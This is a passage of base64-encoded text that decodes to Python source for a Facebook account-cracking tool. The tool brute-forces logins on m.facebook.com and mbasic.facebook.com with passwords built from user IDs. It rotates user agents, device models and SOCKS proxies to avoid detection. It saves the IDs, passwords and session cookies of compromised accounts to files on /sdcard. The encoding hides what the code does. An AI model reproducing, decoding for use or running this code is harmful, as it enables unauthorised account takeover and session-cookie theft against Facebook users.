szN21VU0VSIE5BTUUgXDAzM1sxOzMybSA6ICcranNuKQogICAgICAgIHByaW50KGYnXDAzM1sxOzMxbVtcMDMzWzE7MzdtK1wwMzNbMTszMW1dXDAzM1sxOzM3bVRPVEFMIEFDQ09VTlQgOiAnICsgdGwpCiAgICAgICAgcHJpbnQoZidcMDMzWzE7MzFtW1wwMzNbMTszN20rXDAzM1sxOzMxbV1cMDMzWzE7MzdtVE9UQUwgQUNDT1VOVCA6ICcgKyBjb2RlKQogICAgICAgIHByaW50KGYnXDAzM1sxOzMxbVtcMDMzWzE7MzdtK1wwMzNbMTszMW1dXDAzM1sxOzM3bUlGIE5PIFJFU1VMVCBVU0UgQUlSUExBTkUgTU9ERScpCiAgICAgICAgbGluZXgoKQogICAgICAgIGZvciBjdWRpIGluIHVzZXI6CiAgICAgICAgICAgIHVpZD1jb2RlK2N1ZGkKICAgICAgICAgICAgcHogPSBjdWRpWzI6XQogICAgICAgICAgICBsYyA9IGN1ZGlbOjZdCiAgICAgICAgICAgIG54ID0gY3VkaVsxOl0KICAgICAgICAgICAgdmMgPSB1aWRbOjZdCiAgICAgICAgICAgIGtrID0gdWlkWzo3XQogICAgICAgICAgICBwc3M9W3VpZCxjdWRpLHB6LHZjLGxjLG54LGtrXQogICAgICAgICAgICBhcmlmaW4uc3VibWl0KG0xLHVpZCxwc3MsdGwpCiAgICBwcmludCgnJykKICAgIGxpbmV4KCkKICAgIHByaW50KCJcMDMzWzE7MzdtW1wwMzNbMTszMm09XDAzM1sxOzM3bV0gXDAzM1sxOzMybUNyYWNrZWQgRG9uZSEiKQogICAgcHJpbnQoJ1wwMzNbMTszN21bXDAzM1sxOzMybT1cMDMzWzE7MzdtXSBcMDMzWzE7MzJtVG90YWwgT2svQ3A6ICcrc3RyKGxlbihva3MpKSsnLycrc3RyKGxlbihjcHMpKSkKICAgIGxpbmV4KCkKCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLShNQVRIT0QgQk9YKS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIwpkZWYgbTEodWlkLHBzcyx0bCk6CiAgICBnbG9iYWwgbG9vcAogICAgZ2xvYmFsIGNwcwogICAgZ2xvYmFsIG9rcwogICAgZ2xvYmFsIHByb3h5CiAgICB0cnk6CiAgICAgICAgZm9yIHBzIGluIHBzczoKICAgICAgICAgICAgcHJvID0gcmFuZG9tLmNob2ljZSh1Z2VuKQogICAgICAgICAgICBzZXNzaW9uID0gcmVxdWVzdHMuU2Vzc2lvbigpCiAgICAgICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZidcclwwMzNbMTszN21bXDAzM1sxOzMybUFMQU1HSVIt8J2fkvCdn47wnZ+SXDAzM1sxOzM3bV1cMDMzWzE7MzFtLVwwMzNbMTszN21bXDAzM1sxOzMybSVzLyVzXDAzM1sxOzM3bV1cMDMzWzE7MzFtLVwwMzNbMTszN21bXDAzM1sxOzMybU9LOiVzXDAzM1sxOzM3bV1cciclKGxvb3AsdGwsbGVuKG9rcykpKSwKICAgICAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpCiAgICAgICAgICAgIGZyZWVfZmIgPSBzZXNzaW9uLmdldCgnaHR0cHM6Ly9tLmZhY2Vib29rLmNvbScpLnRleHQKICAgICAgICAgICAgbG9nX2RhdGEgPSB7CiAgICAgICAgICAgICAgICAibHNkIjpyZS5zZWFyY2goJ25hbWU9ImxzZCIgdmFsdWU9IiguKj8pIicsIHN0cihmcmVlX2ZiKSkuZ3JvdXAoMSksCiAgICAgICAgICAgICJqYXpvZXN0IjpyZS5zZWFyY2goJ25hbWU9Imphem9lc3QiIHZhbHVlPSIoLio/KSInLCBzdHIoZnJlZV9mYikpLmdyb3VwKDEpLAogICAgICAgICAgICAibV90cyI6cmUuc2VhcmNoKCduYW1lPSJtX3RzIiB2YWx1ZT0iKC4qPykiJywgc3RyKGZyZWVfZmIpKS5ncm91cCgxKSwKICAgICAgICAgICAgImxpIjpyZS5zZWFyY2goJ25hbWU9ImxpIiB2YWx1ZT0iKC4qPykiJywgc3RyKGZyZWVfZmIpKS5ncm91cCgxKSwKICAgICAgICAgICAgInRyeV9udW1iZXIiOiIwIiwKICAgICAgICAgICAgInVucmVjb2duaXplZF90cmllcyI6IjAiLAogICAgICAgICAgICAiZW1haWwiOnVpZCwKICAgICAgICAgICAgInBhc3MiOnBzLAogICAgICAgICAgICAibG9naW4iOiJMb2cgSW4ifQogICAgICAgICAgICBoZWFkZXJfZnJlZWZiID0geyJhdXRob3JpdHkiOiAnbS5mYWNlYm9vay5jb20nLAogICAgICAgICAgICAibWV0aG9kIjogJ0dFVCcsCiAgICAgICAgICAgICJzY2hlbWUiOiAnaHR0cHMnLAogICAgICAgICAgICAnYWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuNycsCiAgICAnYWNjZXB0LWxhbmd1YWdlJzogJ2VuLVVTLGVuO3E9MC45JywKICAgICdjYWNoZS1jb250cm9sJzogJ21heC1hZ2U9MCcsCiAgICAjICdjb29raWUnOiAnZGF0cj1XQl8yWlJaQzFQcFlsRk4zOXFHMDUyZi07IHNiPVdCXzJaZUlHTlVpQXpEM2twLUdWc2RJRTsgbG9jYWxlPWVuX1VTOyBwc19sPTA7IHBzX249MDsgdnBkPXYxJTNCNjQ4eDM2MHgyOyB3bF9jYnY9djIlM0JjbGllbnRfdmVyc2lvbiUzQTI0MzclM0J0aW1lc3RhbXAlM0ExNzEwNjU5ODEwOyBtX3BpeGVsX3JhdGlvPTI7IHdkPTM2MHg2NDg7IGZyPTBsVEs2aXJSWFo3a0lMV0NGLkFXVW1yU1UzX3ljOUctbHNRblloaWVOOHMxZy5CbDloOVkuLkFBQS4wLjAuQmwtSUZvLkFXWE5JYzlNN0F3JywKICAgICdkcHInOiAnMicsCiAgICAnc2VjLWNoLXByZWZlcnMtY29sb3Itc2NoZW1lJzogJ2RhcmsnLAogICAgJ3NlYy1jaC11YSc6ICciTm90LUEuQnJhbmQiO3Y9Ijk5IiwgIkNocm9taXVtIjt2PSIxMjQiJywKICAgICdzZWMtY2gtdWEtZnVsbC12ZXJzaW9uLWxpc3QnOiAnIk5vdC1BLkJyYW5kIjt2PSI5OS4wLjAuMCIsICJDaHJvbWl1bSI7dj0iMTI0LjAuNjMyNy4xIicsCiAgICAnc2VjLWNoLXVhLW1vYmlsZSc6ICc/MScsCiAgICAnc2VjLWNoLXVhLW1vZGVsJzogJyJSTVgzNTAxIicsCiAgICAnc2VjLWNoLXVhLXBsYXRmb3JtJzogJyJBbmRyb2lkIicsCiAgICAnc2VjLWNoLXVhLXBsYXRmb3JtLXZlcnNpb24nOiAnIjEzLjAuMCInLAogICAgJ3NlYy1mZXRjaC1kZXN0JzogJ2RvY3VtZW50JywKICAgICdzZWMtZmV0Y2gtbW9kZSc6ICduYXZpZ2F0ZScsCiAgICAnc2VjLWZldGNoLXNpdGUnOiAnbm9uZScsCiAgICAnc2VjLWZldGNoLXVzZXInOiAnPzEnLAogICAgJ3VwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMnOiAnMScsCiAgICAndXNlci1hZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IEspIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjQuMC4wLjAgTW9iaWxlIFNhZmFyaS81MzcuMzYnLAogICAgJ3ZpZXdwb3J0LXdpZHRoJzogJzk4MCcsfQogICAgICAgICAgICBsbyA9IHNlc3Npb24ucG9zdCgnaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLz9yZWZzcmM9ZGVwcmVjYXRlZCZsd3Y9MTAwJnJlZmlkPTgnLGRhdGE9bG9nX2RhdGEsaGVhZGVycz1oZWFkZXJfZnJlZWZiKS50ZXh0CiAgICAgICAgICAgIGxvZ19jb29raWVzPXNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLmtleXMoKQogICAgICAgICAgICBpZiAnY191c2VyJyBpbiBsb2dfY29va2llczoKICAgICAgICAgICAgICAgIGNva2k9IiAiLmpvaW4oW2tleSsiPSIrdmFsdWUgZm9yIGtleSx2YWx1ZSBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpXSkKICAgICAgICAgICAgICAgIGNpZCA9IGNva2lbNjU6ODBdCiAgICAgICAgICAgICAgICBwcmludCgnXHJcclwwMzNbMTszN21bXDAzM1sxOzMybUFMSVZFXDAzM1sxOzM3bV1cMDMzWzE7MzdtICcgK2NpZCsgJ1wwMzNbMTszM20gfCBcMDMzWzE7MzdtJyArcHMrICAnJykKICAgICAgICAgICAgICAgIHByaW50KCdcclxyXDAzM1sxOzM3bVtcMDMzWzE7MzJtQ09PS0lFXDAzM1sxOzM3bV1cMDMzWzE7MzdtICcgK2Nva2kpCiAgICAgICAgICAgICAgICAjcHJpbnQoJ1wwMzNbMTszMm3ilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIEnKQogICAgICAgICAgICAgICAgb3BlbignL3NkY2FyZC9BTElWRS1PSy1DT09LSUUnLCAnYScpLndyaXRlKGNpZCsnfCcrcHMrJ3wnK2Nva2krJ1xuJykKICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQodWlkKQogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgZWxpZiAnY2hlY2twb2ludCcgaW4gbG9nX2Nvb2tpZXM6CiAgICAgICAgICAgICAgICBjb2tpPSI7Ii5qb2luKFtrZXkrIj0iK3ZhbHVlIGZvciBrZXksdmFsdWUgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKV0pCiAgICAgICAgICAgICAgICBjaWQgPSBjb2tpWzgyOjk3XQogICAgICAgICAgICAgICAgI3ByaW50KGYiXHgxYlszODs1OzE5Nm1bQUxJVkUt8J+SiV0ge3VpZH0gfCB7cHN9IikKICAgICAgICAgICAgICAgIG9wZW4oJy9zZGNhcmQvQUxJVkUtQ1AudHh0JywgJ2EnKS53cml0ZSggdWlkKycgfCAnK3BzKycgXG4nKQogICAgICAgICAgICAgICAgY3BzLmFwcGVuZCh1aWQpCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICBsb29wKz0xCiAgICAgICAgCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcGFzcwpkZWYgbWV0Mih1aWQscHNzLHRvdGFsKToKICAgIGdsb2JhbCBvawogICAgZ2xvYmFsIGxvb3AKICAgIGdsb2JhbCBjcAogICAgdHJ5OgogICAgICAgIGZvciBwcyBpbiBwc3M6CiAgICAgICAgICAgIHNlc3Npb24gPSByZXF1ZXN0cy5TZXNzaW9uKCkKICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmJ1xyXDAzM1sxOzM3bVtcMDMzWzE7MzJtQUxBTUdJUi1NMlwwMzNbMTszN21dXDAzM1sxOzMxbVtcMDMzWzE7MzNte2xvb3B9L3t0b3RhbH1cMDMzWzE7MzBtXSBcMDMzWzE7OTBtW1wwMzNbMTszMm1PS1wwMzNbMTszMG1dXDAzM1sxOzM3bS1cMDMzWzE7MzJte2xlbihvayl9XHInKQogICAgICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICAgICAgbW9kZWxzID0gcmFuZG9tLmNob2ljZShbJ1NNLUoxMDBGJywgJ1NNLUoxMDBGTicsICdTTS1KMTAwSCcsICdTTS1KMTAwSC9ERCcsICdTTS1KMTAwSCcsICdTTS1KMTAwTScsICdTTS1KMTAwTVUnLCAnU00tSjEwME1MJywgJ1NNLUoxMDBWUFAnLCAnU00tSjEwMFknLCAnU00tSjExMUYnLCAnU00tSjExMEcnLCAnU00tSjExMEYnLCAnU00tSjExMEgnLCAnU00tSjExME0nLCAnU00tSjExMEwnLCAnU00tSjExMU0nLCAnU00tTTUyNkJSJywgJ1NNLU01MjZCUi9EUycsICdTTS1NNTI2QicsICdTTS1NNTI2Qi9EUycsICdTTS1BMzI2QicsICdTTS1BMzI2Qi9EUycsICdTTS1BMzI2QlIvRFMnLCAnU00tQTMyNkJSJywgJ1NNLUEzMjZVJywgJ1NNLUEzMjZXJywgJ1NNLUEzMjZVMScsICdTTS1BMzI2SycsICdTQ0cwOCcsICdTTS1TMzI2REwnLCAnVjIwMjcnLCAnVjIwMzInLCAnUk1YMjAyNycsICdSTVgyMDIwJywgJ1JNWDIwMjEnLCAnQ1BIMTk2OScsICdDUEgyMjA5JywgJ0NQSDE5ODcnXSkKICAgICAgICAgICAgdWEgPSByYW5kb20uY2hvaWNlKHVnZW4pCiAgICAgICAgICAgIHJyID0gcmFuZG9tLnJhbmRpbnQKICAgICAgICAgICAgcmMgPSByYW5kb20uY2hvaWNlCiAgICAgICAgICAgIG5pcD1yYW5kb20uY2hvaWNlKHByb3gpCiAgICAgICAgICAgIHByb3hzID0geydodHRwJzogJ3NvY2tzNDovLycrbmlwfQogICAgICAgICAgICBzZXNzaW9uLmhlYWRlcnMudXBkYXRlKHsiSG9zdCI6ICJtLmZhY2Vib29rLmNvbSIsImNhY2hlLWNvbnRyb2wiOiAibWF4LWFnZT0wIiwidXNlci1hZ2VudCI6IHVhLCJhY2NlcHQiOiAidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC43Iiwic2VjLWNoLXVhIjogJyIgTm90IEE7QnJhbmQiO3Y9Ijk5IiwgIkNocm9taXVtIjt2PSIxMTYiJywic2VjLWNoLXVhLW1vYmlsZSI6ICI/MCIsInNlYy1mZXRjaC1zaXRlIjogInNhbWUtb3JpZ2luIiwic2VjLWZldGNoLW1vZGUiOiAiY29ycyIsInNlYy1mZXRjaC1kZXN0IjogImVtcHR5Iiwic2VjLWZldGNoLXVzZXIiOiAiPzEiLCJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIjogIjEiLCJhY2NlcHQtbGFuZ3VhZ2UiOiAiaWQtSUQsaWQ7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjcifSkKICAgICAgICAgICAgbGluayA9IHNlc3Npb24uZ2V0KCJodHRwczovL20uZmFjZWJvb2suY29tL2xvZ2luLnBocD9za2lwX2FwaV9sb2dpbj0xJmFwaV9rZXk9MTY2MzYzMjQzMzk5OTI0JmtpZF9kaXJlY3RlZF9zaXRlPTAmYXBwX2lkPTE2NjM2MzI0MzM5OTkyNCZzaWduZWRfbmV4dD0xJm5leHQ9aHR0cHMlM0ElMkYlMkZtLmZhY2Vib29rLmNvbSUyRmRpYWxvZyUyRm9hdXRoJTNGY2xpZW50X2lkJTNEMTY2MzYzMjQzMzk5OTI0JTI2ZGlzcGxheSUzRHBvcHVwJTI2cmVkaXJlY3RfdXJpJTNEaHR0cHMlMjUzQSUyNTJGJTI1MkZ0aGlyZHBhcnR5LmFsaWV4cHJlc3MuY29tJTI1MkZmYmNhbGxiYWNrLmh0bSUyNnNjb3BlJTNEZW1haWwlMjUyQ3B1YmxpY19wcm9maWxlJTI1MkN1c2VyX21lc3Nlbmdlcl9jb250YWN0JTI2bWVzc2VuZ2VyX3BhZ2VfaWQlM0QzMzU5NjMzMDc1NjAlMjZzdGF0ZSUzREo3Um9QdzlERXJ2M0p2UCUyNTJCbkoxeEJYQmRTd2pHWCUyNTJCVU5BVTZKVlVuRGNmV0g1S2hOOVlTNGowQWd2bFJzOWRRRUJyR2lkbFA4JTI1MkZ2bkFVOEo1TnVKSzk0ZUV2VGVpRFBiTGNBZUN2NENId2Y3V3FuRTU5ekJRalZ1V0Y2cWh5TGRSbzVicG1zdGV6bjkwNmV0eURjVGpwOFpCTXZ4QUdGSzlSS0k3amFlcGpPbmZueEFlQTZyR1dFZ085NWp2Njd3NllaWVZZUGJsNnRacVd2ZkptQUhrUUElMjUzRCUyNTNEJTI2cmV0JTNEbG9naW4lMjZmYmFwcF9wcmVzJTNEMCUyNmxvZ2dlcl9pZCUzRGY4NjM3OGRkLTEwOTctNDkzMC1iYWY0LWY4YTA1ZTQ2OWY2OCUyNnRwJTNEdW5zcGVjaWZpZWQmY2FuY2VsX3VybD1odHRwcyUzQSUyRiUyRnRoaXJkcGFydHkuYWxpZXhwcmVzcy5jb20lMkZmYmNhbGxiYWNrLmh0bSUzRmVycm9yJTNEYWNjZXNzX2RlbmllZCUyNmVycm9yX2NvZGUlM0QyMDAlMjZlcnJvcl9kZXNjcmlwdGlvbiUzRFBlcm1pc3Npb25zJTJCZXJyb3IlMjZlcnJvcl9yZWFzb24lM0R1c2VyX2RlbmllZCUyNnN0YXRlJTNESjdSb1B3OURFcnYzSnZQJTI1MkJuSjF4QlhCZFN3akdYJTI1MkJVTkFVNkpWVW5EY2ZXSDVLaE45WVM0ajBBZ3ZsUnM5ZFFFQnJHaWRsUDglMjUyRnZuQVU4SjVOdUpLOTRlRXZUZWlEUGJMY0FlQ3Y0Q0h3ZjdXcW5FNTl6QlFqVnVXRjZxaHlMZFJvNWJwbXN0ZXpuOTA2ZXR5RGNUanA4WkJNdnhBR0ZLOVJLSTdqYWVwak9uZm54QWVBNnJHV0VnTzk1anY2N3c2WVpZVllQYmw2dFpxV3ZmSm1BSGtRQSUyNTNEJTI1M0QlMjNfJTNEXyZkaXNwbGF5PXRvdWNoJmxvY2FsZT1pZF9JRCZwbF9kYmw9MCZyZWZzcmM9ZGVwcmVjYXRlZCZfcmRyIikKICAgICAgICAgICAgZGF0YSA9IHsnbV90cyc6IHJlLnNlYXJjaCgnbmFtZT0ibV90cyIgdmFsdWU9IiguKj8pIicsc3RyKGxpbmsudGV4dCkpLmdyb3VwKDEpLCdsaSc6IHJlLnNlYXJjaCgnbmFtZT0ibGkiIHZhbHVlPSIoLio/KSInLHN0cihsaW5rLnRleHQpKS5ncm91cCgxKSwndHJ5X251bWJlcic6ICcwJywndW5yZWNvZ25pemVkX3RyaWVzJzogJzAnLCdlbWFpbCc6IHVpZCwncHJlZmlsbF9jb250YWN0X3BvaW50JzogJycsJ3ByZWZpbGxfc291cmNlJzogJycsJ3ByZWZpbGxfdHlwZSc6ICcnLCdmaXJzdF9wcmVmaWxsX3NvdXJjZSc6ICcnLCdmaXJzdF9wcmVmaWxsX3R5cGUnOiAnJywKICAgICAgICAgICAgJ2hhZF9jcF9wcmVmaWxsZWQnOiAnZmFsc2UnLAogICAgICAgICAgICAnaGFkX3Bhc3N3b3JkX3ByZWZpbGxlZCc6ICdmYWxzZScsCiAgICAgICAgICAgICdpc19zbWFydF9sb2NrJzogJ3RydWUnLAogICAgICAgICAgICAnYmlfeHJ3aCc6IHJlLnNlYXJjaCgnbmFtZT0iYmlfeHJ3aCIgdmFsdWU9IiguKj8pIicsc3RyKGxpbmsudGV4dCkpLmdyb3VwKDEpLCdwYXNzJzogcHMsJ2phem9lc3QnOiByZS5zZWFyY2goJ25hbWU9Imphem9lc3QiIHZhbHVlPSIoLio/KSInLHN0cihsaW5rLnRleHQpKS5ncm91cCgxKSwnbHNkJzogcmUuc2VhcmNoKCduYW1lPSJsc2QiIHZhbHVlPSIoLio/KSInLHN0cihsaW5rLnRleHQpKS5ncm91cCgxKSwKICAgICAgICAgICAgIl9fZHluIjogIiIsCiAgICAgICAgICAgICJfX2NzciI6ICIiLAogICAgICAgICAgICAiX19yZXEiOiByYyhbIjEiLCIyIiwiMyIsIjQiLCI1IiwiNiIsIjciLCI4IiwiOSIsIjAiXSksCiAgICAgICAgICAgICJfX2EiOiAiIiwKICAgICAgICAgICAgIl9fdXNlciI6ICIwIiwKICAgICAgICAgICAgIl9mYl9ub3NjcmlwdCI6ICJ0cnVlIn0KICAgICAgICAgICAgaGVhZGVycyA9IHsKICAgICAgICAgICAgJ0hvc3QnOiAnbWJhc2ljLmZhY2Vib29rLmNvbScsCiAgICAgICAgICAgICdhY2NlcHQnOiAnKi8qJywKICAgICAgICAgICAnYWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuNycsCiAgICAnYWNjZXB0LWxhbmd1YWdlJzogJ2VuLVVTLGVuO3E9MC45JywKICAgICdjYWNoZS1jb250cm9sJzogJ21heC1hZ2U9MCcsCiAgICAjICdjb29raWUnOiAnZGF0cj1XQl8yWlJaQzFQcFlsRk4zOXFHMDUyZi07IHNiPVdCXzJaZUlHTlVpQXpEM2twLUdWc2RJRTsgbG9jYWxlPWVuX1VTOyBwc19sPTA7IHBzX249MDsgdnBkPXYxJTNCNjQ4eDM2MHgyOyB3bF9jYnY9djIlM0JjbGllbnRfdmVyc2lvbiUzQTI0MzclM0J0aW1lc3RhbXAlM0ExNzEwNjU5ODEwOyB3ZD0zNjB4NjQ4OyBmcj0wbFRLNmlyUlhaN2tJTFdDRi5BV1dyLUhqZGt4dmRBaEFOT0FSUWNsUnRFSjAuQmw5aDlZLi5BQUEuMC4wLkJsOXFCTy5BV1hpOW51VXBUQScsCiAgICAnZHByJzogJzInLAogICAgJ3NlYy1jaC1wcmVmZXJzLWNvbG9yLXNjaGVtZSc6ICdkYXJrJywKICAgICdzZWMtY2gtdWEnOiAnIk5vdC1BLkJyYW5kIjt2PSI5OSIsICJDaHJvbWl1bSI7dj0iMTI0IicsCiAgICAnc2VjLWNoLXVhLWZ1bGwtdmVyc2lvbi1saXN0JzogJyJOb3QtQS5CcmFuZCI7dj0iOTkuMC4wLjAiLCAiQ2hyb21pdW0iO3Y9IjEyNC4wLjYzMjcuMSInLAogICAgJ3NlYy1jaC11YS1tb2JpbGUnOiAnPzEnLAogICAgJ3NlYy1jaC11YS1tb2RlbCc6ICciUk1YMzUwMSInLAogICAgJ3NlYy1jaC11YS1wbGF0Zm9ybSc6ICciQW5kcm9pZCInLAogICAgJ3NlYy1jaC11YS1wbGF0Zm9ybS12ZXJzaW9uJzogJyIxMy4wLjAiJywKICAgICdzZWMtZmV0Y2gtZGVzdCc6ICdkb2N1bWVudCcsCiAgICAnc2VjLWZldGNoLW1vZGUnOiAnbmF2aWdhdGUnLAogICAgJ3NlYy1mZXRjaC1zaXRlJzogJ25vbmUnLAogICAgJ3NlYy1mZXRjaC11c2VyJzogJz8xJywKICAgICd1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzJzogJzEnLAogICAgJ3VzZXItYWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTI0LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2JywKICAgICd2aWV3cG9ydC13aWR0aCc6ICc5ODAnLH0KICAgICAgICAgICAga29raSA9ICgiOyIpLmpvaW4oWyAiJXM9JXMiICUgKGtleSwgdmFsdWUpIGZvciBrZXksIHZhbHVlIGluIGxpbmsuY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCkgXSkKICAgICAgICAgICAga29raSs9JyBtX3BpeGVsX3JhdGlvPTIuNjI1OyB3ZD00MTJ4NzU2JwogICAgICAgICAgICBwYXJhbXMgPSB7CiAgICAgICAgICAgICdhcGlfa2V5JzogJzE2NjM2MzI0MzM5OTkyNCcsCiAgICAgICAgICAgICdhdXRoX3Rva2VuJzogJ2NmN2MzYTI4OWQ2OTZlN2NhODdhNTE2MjkxMGJkNWMzJywKICAgICAgICAgICAgJ3NraXBfYXBpX2xvZ2luJzogJzEnLAogICAgICAgICAgICAnc2lnbmVkX25leHQnOiAnMScsCiAgICAgICAgICAgICduZXh0JzogJ2h0dHBzOi8vbS5mYWNlYm9vay5jb20vZGlhbG9nL29hdXRoP2NsaWVudF9pZD0xNjYzNjMyNDMzOTk5MjQmZGlzcGxheT1wb3B1cCZyZWRpcmVjdF91cmk9aHR0cHMlM0ElMkYlMkZ0aGlyZHBhcnR5LmFsaWV4cHJlc3MuY29tJTJGZmJjYWxsYmFjay5odG0mc2NvcGU9ZW1haWwlMkNwdWJsaWNfcHJvZmlsZSUyQ3VzZXJfbWVzc2VuZ2VyX2NvbnRhY3QmbWVzc2VuZ2VyX3BhZ2VfaWQ9MzM1OTYzMzA3NTYwJnN0YXRlPUo3Um9QdzlERXJ2M0p2UCUyQm5KMXhCWEJkU3dqR1glMkJVTkFVNkpWVW5EY2ZXSDVLaE45WVM0ajBBZ3ZsUnM5ZFFFQnJHaWRsUDglMkZ2bkFVOEo1TnVKSzk0ZUV2VGVpRFBiTGNBZUN2NENId2Y3V3FuRTU5ekJRalZ1V0Y2cWh5TGRSbzVicG1zdGV6bjkwNmV0eURjVGpwOFpCTXZ4QUdGSzlSS0k3amFlcGpPbmZueEFlQTZyR1dFZ085NWp2Njd3NllaWVZZUGJsNnRacVd2ZkptQUhrUUElM0QlM0QmcmV0PWxvZ2luJmZiYXBwX3ByZXM9MCZsb2dnZXJfaWQ9Zjg2Mzc4ZGQtMTA5Ny00OTMwLWJhZjQtZjhhMDVlNDY5ZjY4JnRwPXVuc3BlY2lmaWVkJywKICAgICAgICAgICAgJ3JlZnNyYyc6ICdkZXByZWNhdGVkJywKICAgICAgICAgICAgJ2FwcF9pZCc6ICcxNjYzNjMyNDMzOTk5MjQnLAogICAgICAgICAgICAnY2FuY2VsJzogJ2h0dHBzOi8vdGhpcmRwYXJ0eS5hbGlleHByZXNzLmNvbS9mYmNhbGxiYWNrLmh0bT9lcnJvcj1hY2Nlc3NfZGVuaWVkJmVycm9yX2NvZGU9MjAwJmVycm9yX2Rlc2NyaXB0aW9uPVBlcm1pc3Npb25zK2Vycm9yJmVycm9yX3JlYXNvbj11c2VyX2RlbmllZCZzdGF0ZT1KN1JvUHc5REVydjNKdlAlMkJuSjF4QlhCZFN3akdYJTJCVU5BVTZKVlVuRGNmV0g1S2hOOVlTNGowQWd2bFJzOWRRRUJyR2lkbFA4JTJGdm5BVThKNU51Sks5NGVFdlRlaURQYkxjQWVDdjRDSHdmN1dxbkU1OXpCUWpWdVdGNnFoeUxkUm81YnBtc3Rlem45MDZldHlEY1RqcDhaQk12eEFHRks5UktJN2phZXBqT25mbnhBZUE2ckdXRWdPOTVqdjY3dzZZWllWWVBibDZ0WnFXdmZKbUFIa1FBJTNEJTNEI189XycsCiAgICAgICAgICAgICdsd3YnOiAnMTAwJywKICAgICAgICAgICAgfQogICAgICAgICAgICBsbyA9IHNlc3Npb24ucG9zdCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9sb2dpbi9hc3luYy8/cmVmc3JjPWRlcHJlY2F0ZWQmbHd2PTEwMCIscGFyYW1zPXBhcmFtcyxjb29raWVzPXsnY29va2llJzoga29raX0saGVhZGVycz1oZWFkZXJzLGRhdGE9ZGF0YSxhbGxvd19yZWRpcmVjdHM9RmFsc2UscHJveGllcz1wcm94cykKICAgICAgICAgICAgbG9nX2Nvb2tpZXM9c2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCkua2V5cygpCiAgICAgICAgICAgIGlmICdjX3VzZXInIGluIGxvZ19jb29raWVzOgogICAgICAgICAgICAgICAgY29raT0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCldKQogICAgICAgICAgICAgICAgaWRmID0gcmUuZmluZGFsbCgnY191c2VyPSguKik7eHMnLCBjb2tpKVswXQogICAgICAgICAgICAgICAgcHJpbnQoJ1xyXHJcMDMzWzE7MzdtW1wwMzNbMTszMm1BTElWRVwwMzNbMTszN21dXDAzM1sxOzM3bSAnICtpZGYrICdcMDMzWzE7MzNtIHwgXDAzM1sxOzM3bScgK3BzKyAgJycpCiAgICAgICAgICAgICAgICBwcmludCgnXHJcclwwMzNbMTszN21bXDAzM1sxOzMybUNPT0tJRVwwMzNbMTszN21dXDAzM1sxOzM3bSAnICtjb2tpKQogICAgICAgICAgICAgICAgb3BlbignL3NkY2FyZC9BTElWRS1PSy1NMi50eHQnLCdhJykud3JpdGUoaWRmKyd8JytwcysnfCcrY29raSsnXG4nKQogICAgICAgICAgICAgICAgb2suYXBwZW5kKGlkZikKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGVsaWYgJ2NoZWNrcG9pbnQnIGluIGxvZ19jb29raWVzOgogICAgICAgICAgICAgICAgaWYgJ3knIGluIGNweDoKICAgICAgICAgICAgICAgICAgICBjb2tpPSI7Ii5qb2luKFtrZXkrIj0iK3ZhbHVlIGZvciBrZXksdmFsdWUgaW4gc2Vzc2lvbi5